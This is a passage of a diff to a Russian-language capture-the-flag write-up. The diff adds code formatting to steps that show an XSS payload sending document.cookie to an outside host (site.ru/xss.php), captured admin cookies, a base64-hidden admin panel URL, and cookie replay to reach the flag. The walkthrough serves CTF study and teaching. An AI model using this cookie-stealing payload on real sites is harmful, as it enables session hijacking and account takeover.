@@ -30,7 +30,7 @@ fclose($file);
 ```js
 <script>var img=new Image();img.src="http://site.ru/xss.php?"+ encodeURI(document.cookie);</script>
 ```
-4. Ждем 10 минут, смотрим полученные куки. password=e0377f6e85d987d81e96c0381c789360fe90547bdf9be3b5082a492b9c4184f7; login=admin
-5. Теперь необходимо где-то применить полученные куки. Для этого ищем админку или авторизацию. На любой странице можно найти комментарий: Secret admin panel: aHR0cDovLzEwLjAuNy4yMTY6NTQzMzcvYWRtaW42NDY0MS5waHA=.  Раскодируем base64, получаем - http://10.0.7.216:54337/admin64641.php
+4. Ждем 10 минут, смотрим полученные куки. `password=e0377f6e85d987d81e96c0381c789360fe90547bdf9be3b5082a492b9c4184f7; login=admin`
+5. Теперь необходимо где-то применить полученные куки. Для этого ищем админку или авторизацию. На любой странице можно найти комментарий: `Secret admin panel: aHR0cDovLzEwLjAuNy4yMTY6NTQzMzcvYWRtaW42NDY0MS5waHA=`.  Раскодируем base64, получаем - http://10.0.7.216:54337/admin64641.php
 6. Видим надпись: "Неверный логин или пароль! Доступ запрещен!". Используем любое расширение для назначения куков. Для Firefox - https://addons.mozilla.org/ru/firefox/addon/cookies-manager-plus/developers 
-7. На странице admin64641.php видим флаг.
+7. На странице `admin64641.php` видим флаг.
